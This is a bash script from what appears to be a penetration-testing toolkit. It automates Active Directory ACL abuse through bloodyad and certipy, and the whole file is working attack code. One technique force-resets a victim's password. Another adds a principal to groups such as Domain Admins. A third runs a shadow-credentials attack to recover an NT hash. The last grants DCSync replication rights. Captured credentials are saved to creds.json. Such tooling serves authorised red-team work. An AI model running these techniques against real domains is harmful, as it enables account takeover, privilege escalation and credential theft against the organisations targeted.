#!/usr/bin/env bash
# =============================================================================
#  dacl_abuse.sh  —  ACL/DACL abuse via bloodyad (+ certipy)  (ATOMIC)
# =============================================================================
#  Attack-chain role: turn an ACL edge that BloodHound found (GenericAll,
#  WriteDACL, ForceChangePassword, AddSelf, etc.) into concrete access. One
#  technique per run, selected with -T.
#
#  Techniques (-T / --technique):
#    ForceChangePassword  reset a victim's password      (-o victim [-w newpass])
#    AddMember            add a principal to a group      (-g group [-a principal])
#    ShadowCred           shadow-credentials via certipy  (-o victim)  → NT hash
#    DCSync               grant DCSync rights to a principal (-a principal)
#
#  Resulting access/creds are appended to creds.json where applicable.
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
dacl_abuse.sh — ACL/DACL abuse via bloodyad (+certipy) (ATOMIC)

USAGE:   ./dacl_abuse.sh -T <technique> [opts] [-t dc] [-d domain]
TECHNIQUES (-T):
  ForceChangePassword  -o <victim> [-w <newpass>]   reset victim; store new pw
  AddMember            -g <group>  [-a <principal>] add principal to group
  ShadowCred           -o <victim>                  certipy shadow -> NT hash
  DCSync               -a <principal>               grant replication rights

FLAGS:
  -T, --technique <name>    which abuse to run (required)
  -o, --target-object <dn>  victim object (ForceChangePassword / ShadowCred)
  -g, --group <group>       target group (AddMember)
  -a, --principal <who>     principal to act as/grant (default: you)
  -w, --new-pass <pw>       new password (ForceChangePassword; generated if omitted)
  -h, --help                this help
  (shared flags -t/-d/--dc-ip: --help-common)

EXAMPLE: ./dacl_abuse.sh -T AddMember -g 'Domain Admins' -a jdoe
PREREQS: a credential in creds.json holding the needed ACL right; bloodyad
  (certipy for ShadowCred). Results appended to creds.json where applicable.
EOF
}

TECH="" OBJ="" GROUP="" PRINCIPAL="" NEWPASS=""

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    -T|--technique) TECH="$2"; shift 2 ;;
    -o|--target-object) OBJ="$2"; shift 2 ;;
    -g|--group) GROUP="$2"; shift 2 ;;
    -a|--principal) PRINCIPAL="$2"; shift 2 ;;
    -w|--new-pass) NEWPASS="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <dc>"
[[ -n "$TECH"   ]] || die "choose a technique with -T (see --help)"
require_creds "$DOMAIN_OVERRIDE"
DOMAIN="$(resolve_domain)"
PRINCIPAL="${PRINCIPAL:-$SEL_USER}"       # default the acting principal to ourselves

# Track any CLI-supplied secret BEFORE the first log write (log_begin records
# the arg string) so it is redacted even in the run header.
[[ -n "$NEWPASS" ]] && secret_track "$NEWPASS"

log_begin
log_info "technique=${TECH} as ${DOMAIN}/${SEL_USER} (${SEL_STYPE}) vs DC ${DC}"
BAUTH="$(bloodyad_auth)"

case "$TECH" in
  ForceChangePassword)
    [[ -n "$OBJ" ]] || die "ForceChangePassword needs -o <victim>"
    NEWPASS="${NEWPASS:-Cptc!$(date +%s)Aa}"       # generated if not supplied
    need_cmd bloodyad
    secret_track "$NEWPASS"                         # redact the new password immediately
    run_cmd "bloodyad ${BAUTH} set password $(printf '%q' "$OBJ") $(printf '%q' "$NEWPASS")"
    if [[ "$LAST_RC" -eq 0 ]]; then
      creds_add "$DOMAIN" "$OBJ" "password" "$NEWPASS" "DACL ForceChangePassword via ${SEL_USER}, $(date '+%F')"
      log_ok "reset ${OBJ}; password stored in creds.json"
    else
      log_err "password reset failed (do you actually hold ForceChangePassword/GenericAll over ${OBJ}?)"
    fi
    ;;

  AddMember)
    [[ -n "$GROUP" ]] || die "AddMember needs -g <group>"
    need_cmd bloodyad
    run_cmd "bloodyad ${BAUTH} add groupMember $(printf '%q' "$GROUP") $(printf '%q' "$PRINCIPAL")"
    [[ "$LAST_RC" -eq 0 ]] && log_ok "added ${PRINCIPAL} to ${GROUP}" \
                           || log_err "add-to-group failed (check WriteMember/GenericAll over ${GROUP})"
    ;;

  ShadowCred)
    [[ -n "$OBJ" ]] || die "ShadowCred needs -o <victim>"
    need_cmd certipy
    # certipy shadow auto: add a Key Credential, authenticate, recover NT hash.
    SC_CMD="certipy shadow auto $(certipy_auth) -account $(printf '%q' "$OBJ")"
    log_run "$SC_CMD"; exec_capture "$SC_CMD"
    # certipy prints: "Got hash for 'victim@domain': aad3b435...:<NT>"
    nt="$(printf '%s' "$LAST_OUTPUT" | grep -oiE '[a-f0-9]{32}:[a-f0-9]{32}' | tail -n1 | cut -d: -f2)"
    if [[ -n "$nt" ]]; then
      creds_add "$DOMAIN" "$OBJ" "ntlm_hash" "$nt" "Shadow Credentials via ${SEL_USER}, $(date '+%F')"
      log_ok "recovered NT hash for ${OBJ} via shadow credentials"
    else
      log_warn "no NT hash parsed from certipy output (shadow cred may have failed)"
    fi
    log_output                                      # NT hash now tracked → redacted
    ;;

  DCSync)
    need_cmd bloodyad
    # Grant replication rights so dcsync.sh can run as this principal afterward.
    run_cmd "bloodyad ${BAUTH} add dcsync $(printf '%q' "$PRINCIPAL")"
    [[ "$LAST_RC" -eq 0 ]] && log_ok "granted DCSync to ${PRINCIPAL} — now run dcsync.sh with that principal's creds" \
                           || log_err "grant-DCSync failed (need WriteDACL on the domain object)"
    ;;

  *) die "unknown technique: ${TECH} (see --help)" ;;
esac

log_end "success"
